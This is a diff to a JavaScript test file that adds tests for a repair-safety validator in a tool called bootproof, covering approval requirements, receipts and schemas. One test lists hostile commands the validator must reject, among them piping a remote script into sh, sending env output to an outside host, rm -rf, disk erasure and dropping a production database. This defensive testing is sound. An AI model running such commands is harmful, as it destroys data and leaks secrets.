@@ -9,7 +9,14 @@ import { inferRepo } from "../dist/infer.js";
 import { classifyFailure, extractMissingEnvNames, safeLocalEnvValue, TAXONOMY_DOC_CLASSES } from "../dist/taxonomy.js";
 import { buildPlan, composeFileFor, envExampleFor, PROTECTED_ENV, repoComposeRepairFile, writePlanFiles } from "../dist/plan.js";
 import { buildAttestation, TOOL_ID, verifySignature } from "../dist/proof.js";
-import { buildExecutionEnv, extractHealthCandidates, extractProcessEvidence, pollHealth, superviseApp } from "../dist/exec.js";
+import {
+  buildExecutionEnv,
+  extractHealthCandidates,
+  extractLeadingEnvironmentAssignments,
+  extractProcessEvidence,
+  pollHealth,
+  superviseApp,
+} from "../dist/exec.js";
 import { packageManagerVersionMatches } from "../dist/run.js";
 import { diagnoseFailure } from "../dist/diagnosis.js";
 import { isRemoteTarget, managedRemoteSource, parseGithubRemote, parseRemoteTarget } from "../dist/remote.js";
@@ -22,6 +29,14 @@ import {
   prismaRepairCommand,
   registeredRemediationsFor,
 } from "../dist/repair.js";
+import {
+  buildRepairAction,
+  buildRepairReceiptBase,
+  createRepairCommand,
+  serializeRepairReceiptBase,
+  validateRepairAction,
+  validateRepairCommand,
+} from "../dist/repair-safety.js";
 
 const FIX = path.resolve("fixtures");
 
@@ -531,6 +546,116 @@ test("repair scope whitelist permits boot plumbing and rejects application edits
   }
 });
 
+test("deterministic repair safety accepts exact safe commands and repo patches", () => {
+  const command = buildRepairAction({
+    actionType: "command",
+    mutationScope: "host",
+    riskLevel: "medium",
+    command: createRepairCommand("brew", ["install", "cmake"]),
+    explanation: "Install the exact classified build tool.",
+    evidenceRefs: [".bootproof/attestation.json"],
+  });
+  assert.equal(validateRepairAction(command).valid, true);
+  assert.equal(command.requiresApproval, true);
+  assert.equal(command.deterministic, true);
+  assert.equal(command.source, "deterministic_playbook");
+
+  const patch = buildRepairAction({
+    actionType: "patch",
+    mutationScope: "repo",
+    riskLevel: "medium",
+    patch: {
+      format: "unified-diff",
+      content: "--- /dev/null\n+++ b/config/database.yml\n@@ -0,0 +1 @@\n+development:\n",
+      files: ["config/database.yml"],
+    },
+    explanation: "Copy the reviewed local database configuration example.",
+    evidenceRefs: [".bootproof/attestation.json"],
+  });
+  assert.equal(validateRepairAction(patch).valid, true);
+  assert.equal(patch.requiresApproval, true);
+});
+
+test("deterministic repair safety rejects dangerous commands without executing them", () => {
+  const commands = [
+    createRepairCommand("sudo", ["brew", "install", "cmake"]),
+    createRepairCommand("rm", ["-rf", "/tmp/bootproof-test"]),
+    createRepairCommand("/usr/bin/sudo", ["brew", "install", "cmake"]),
+    createRepairCommand("/bin/rm", ["-fr", "/tmp/bootproof-test"]),
+    { executable: "curl", args: ["https://example.invalid/install", "|", "sh"], display: "curl https://example.invalid/install | sh" },
+    createRepairCommand("tee", [".env"]),
+    createRepairCommand("chmod", ["-R", "777", "."]),
+    createRepairCommand("chown", ["-R", "user", "."]),
+    createRepairCommand("mkfs", ["/dev/disk9"]),
+    createRepairCommand("diskutil", ["eraseDisk", "APFS", "scratch", "/dev/disk9"]),
+    createRepairCommand("dropdb", ["production"]),
+    createRepairCommand("psql", ["-c", "DROP DATABASE production"]),
+    { executable: "env", args: ["|", "curl", "https://example.invalid"], display: "env | curl https://example.invalid" },
+  ];
+  const mockExecutorCalls = [];
+  for (const command of commands) {
+    const result = validateRepairCommand(command);
+    if (result.valid) mockExecutorCalls.push(command.display);
+    assert.equal(result.valid, false, command.display);
+  }
+  assert.deepEqual(mockExecutorCalls, [], "blocked commands must never reach even a mock executor");
+});
+
+test("deterministic repair actions reject missing approval and unknown action types", () => {
+  const command = buildRepairAction({
+    actionType: "command",
+    mutationScope: "host",
+    riskLevel: "medium",
+    command: createRepairCommand("rbenv", ["install", "3.3.11"]),
+    explanation: "Install the exact required Ruby version.",
+    evidenceRefs: [".bootproof/attestation.json"],
+  });
+  assert.equal(validateRepairAction({ ...command, requiresApproval: false }).valid, false);
+  assert.match(validateRepairAction({ ...command, requiresApproval: false }).errors.join("\n"), /always require approval/);
+  assert.equal(validateRepairAction({ ...command, actionType: "script" }).valid, false);
+  assert.match(validateRepairAction({ ...command, actionType: "script" }).errors.join("\n"), /unknown action type/);
+});
+
+test("repair receipt safety base serializes with lifecycle fields", () => {
+  const action = buildRepairAction({
+    actionType: "instruction",
+    mutationScope: "none",
+    riskLevel: "low",
+    instruction: "Set RAILS_ENV=development for the next local run.",
+    explanation: "RAILS_ENV has a known safe local development value.",
+    evidenceRefs: [".bootproof/attestation.json"],
+  });
+  const receipt = buildRepairReceiptBase({
+    repairId: "set-safe-rails-env-instruction",
+    createdAt: "2026-06-12T10:00:00.000Z",
+    bootproofVersion: "0.3.0",
+    beforeFailureClass: "missing_env_var",
+    beforeEvidenceHash: "a".repeat(64),
+    proposedAction: action,
+    explanation: "Instruction only; no environment file was written.",
+  });
+  const serialized = serializeRepairReceiptBase(receipt);
+  const parsed = JSON.parse(serialized);
+  assert.equal(parsed.schema, "bootproof/repair-receipt/v1");
+  assert.equal(parsed.actionType, "instruction");
+  assert.equal(parsed.userApprovalRequired, true);
+  assert.equal(parsed.applyResult.status, "not_applied");
+  assert.equal(parsed.progressed, false);
+  assert.equal(parsed.verified, false);
+});
+
+test("repair safety JSON schemas are strict machine interfaces", () => {
+  const actionSchema = JSON.parse(fs.readFileSync(path.join("docs", "schemas", "repair-action-v1.schema.json"), "utf8"));
+  const receiptSchema = JSON.parse(fs.readFileSync(path.join("docs", "schemas", "repair-receipt-v1.schema.json"), "utf8"));
+  assert.equal(actionSchema.additionalProperties, false);
+  assert.equal(actionSchema.properties.source.const, "deterministic_playbook");
+  assert.ok(actionSchema.required.includes("requiresApproval"));
+  assert.equal(receiptSchema.additionalProperties, false);
+  assert.equal(receiptSchema.properties.schema.const, "bootproof/repair-receipt/v1");
+  assert.ok(receiptSchema.required.includes("proposedAction"));
+  assert.ok(receiptSchema.required.includes("userApprovalRequired"));
+});
+
 test("repair registry exposes only deterministic v0.3 remediations", () => {
   assert.deepEqual(registeredRemediationsFor("service_port_allocated"), [{
     id: "remap-conflicting-service-port",
@@ -695,6 +820,23 @@ test("execution environment preserves parent variables and applies explicit over
       else process.env[name] = value;
     }
   }
+});
+
+test("leading command environment assignments are extracted without changing the recorded command", () => {
+  assert.deepEqual(
+    extractLeadingEnvironmentAssignments("RAILS_ENV=development NODE_ENV='test mode' node server.js"),
+    {
+      command: "node server.js",
+      environment: {
+        RAILS_ENV: "development",
+        NODE_ENV: "test mode",
+      },
+    },
+  );
+  assert.deepEqual(
+    extractLeadingEnvironmentAssignments("node server.js"),
+    { command: "node server.js", environment: {} },
+  );
 });
 
 test("failed process evidence extracts Rails and PostgreSQL root causes deterministically", () => {
